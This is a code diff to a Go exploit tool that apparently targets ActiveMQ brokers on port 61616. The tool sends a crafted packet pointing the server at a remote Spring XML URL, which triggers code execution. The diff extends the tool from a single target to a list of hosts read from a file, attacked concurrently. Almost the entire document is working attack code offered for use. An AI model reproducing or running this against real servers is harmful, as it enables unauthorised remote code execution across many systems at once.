@@ -1,24 +1,31 @@
 package main
 
 import (
+	"bufio"
 	"crypto/tls"
 	"encoding/hex"
 	"flag"
 	"fmt"
+    "sync"
 	"net"
+	"os"
 	"strconv"
+	"strings"
 )
 
 func main() {
 
 	var (
 		ip     string
+		ips    string
 		port   string
 		url    string
 		useTLS bool
+        wg      sync.WaitGroup
 	)
 
 	flag.StringVar(&ip, "i", "", "ActiveMQ Server IP or Host")
+	flag.StringVar(&ips, "l", "", "List of ActiveMQ Servers IPs or Hosts and ports separeted by \\n ex: 1.1.1.1:61616")
 	flag.StringVar(&port, "p", "61616", "ActiveMQ Server Port")
 	flag.StringVar(&url, "u", "", "Spring XML URL")
 	flag.BoolVar(&useTLS, "t", false, "Use TLS for connection")
@@ -26,7 +33,7 @@ func main() {
 
 	banner()
 
-	if ip == "" || url == "" {
+	if url == "" || ip != "" && ips != "" {
 		flag.Usage()
 		return
 	}
@@ -39,11 +46,43 @@ func main() {
 	payload := int2Hex(len(body)/2, 8) + body
 	data, _ := hex.DecodeString(payload)
 
-	fmt.Println("[*] Target:", ip+":"+port)
 	fmt.Println("[*] XML URL:", url)
-	fmt.Println()
-	fmt.Println("[*] Sending packet:", payload)
 
+	if ip != "" {
+		fmt.Println()
+		fmt.Println("[*] Sending packet:", payload)
+        wg.Add(1)
+		scan(useTLS, ip, port, data,&wg)
+    } else if ips != "" {
+		fmt.Println("[*] Targets list:", ips+"\n")
+		targets, err := os.Open(ips)
+
+		defer targets.Close()
+
+		if err != nil {
+			fmt.Println("[-] Failed reading:"+ips, err)
+			return
+		}
+
+
+		scanner := bufio.NewScanner(targets)
+		fmt.Println()
+		fmt.Println("[*] Sending packet:", payload)
+		for scanner.Scan() {
+			target := scanner.Text()
+			tg := strings.Split(target, ":")
+            wg.Add(1)
+			go scan(useTLS, tg[0], tg[1], data, &wg)
+		}
+        wg.Wait()
+
+	}
+
+}
+
+func scan(useTLS bool, ip string, port string, data []byte,wg *sync.WaitGroup) {
+
+	fmt.Println("[*] Target:", ip+":"+port)
 	var conn net.Conn
 	var err error
 
@@ -63,6 +102,8 @@ func main() {
 
 	conn.Write(data)
 	conn.Close()
+    wg.Done()
+
 }
 
 func banner() {
